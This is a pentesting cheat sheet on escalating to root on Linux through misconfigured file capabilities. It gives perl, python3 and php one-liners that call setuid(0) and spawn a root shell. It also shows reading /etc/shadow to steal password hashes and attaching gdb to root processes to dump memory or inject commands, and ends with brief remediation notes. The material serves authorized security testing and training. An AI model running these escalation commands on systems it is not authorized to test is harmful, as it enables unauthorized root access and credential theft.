
# Capabilities  

Linux capabilities allow binaries to perform privileged actions **without being SUID**.  
Misconfigured capabilities often lead to full root.

---

## Quick Reference — “Which Capabilities Matter Most?”

| Capability              | What It Allows                                | Why It Matters for PrivEsc                         |
|------------------------|------------------------------------------------|----------------------------------------------------|
| **cap_setuid**         | Change UID / become any user                  | Direct root (`bash -p`, perl/python setuid)       |
| **cap_setgid**         | Change GID                                     | Group privilege escalation                         |
| **cap_dac_override**   | Bypass file permissions                        | Read any file (e.g., `/etc/shadow`)                |
| **cap_dac_read_search**| Read directories & files regardless of perms   | Directory traversal of restricted paths            |
| **cap_sys_ptrace**     | Trace / debug any process                      | Attach to root processes → full compromise         |
| **cap_net_raw**        | Create raw sockets, sniff traffic              | Packet forging, sniffing, spoofing                 |

Prioritize these first when reviewing your `getcap` output.

---

## 1. List All Capabilities

```bash
getcap -r / 2>/dev/null
````

Look especially for:

* `cap_setuid+ep`
* `cap_setgid+ep`
* `cap_dac_read_search+ep`
* `cap_dac_override+ep`
* `cap_net_raw+ep`
* `cap_sys_ptrace+ep`

Unusual binaries with these caps = *privilege escalation target*.

---

## 2. cap_setuid → Direct Root via GTFOBins

### **perl**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### **python3**

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### **php**

```bash
php -r "posix_setuid(0); system('/bin/bash');"
```

If these binaries have `cap_setuid+ep`, the shell becomes **root**.

---

## 3. cap_dac_override + cap_dac_read_search

Read any file, list any directory — even `/etc/shadow`.

```bash
./binary_with_caps /etc/shadow
cat /etc/shadow
```

Use this to steal hashes → escalate.

---

## 4. cap_sys_ptrace

Attach to root-owned processes:

```bash
gdb -p 1
```

If successful → dump memory, capture credentials, or inject commands.

---

## 5. cap_net_raw

Packet crafting & sniffing without sudo.

```bash
tcpdump --list-interfaces
```

If a weird binary uses this → inspect it.
It may allow command injection or be hijackable.

---

## 6. Custom Binaries with Capabilities

If you find:

```bash
/usr/local/bin/customapp = cap_setuid+ep
```

Inspect it:

```bash
strace /usr/local/bin/customapp
```

Identify:

* execve() calls
* fopen() / file access
* controlled user input

Many custom apps with capabilities are vulnerable.

---

## 7. Removing Capabilities (Defensive Notes)

```bash
sudo setcap -r /path/to/binary
```

Use this when suggesting fixes in reports.

---

## 8. Operator Checklist

* [ ] Run `getcap -r /`
* [ ] Identify sensitive capabilities
* [ ] Map binary to GTFOBins technique
* [ ] Test simple setuid escalation
* [ ] Investigate custom binaries with `strace`
* [ ] Document chain & cleanup

---

**Capabilities are SUID in disguise — treat them as root access keys.**


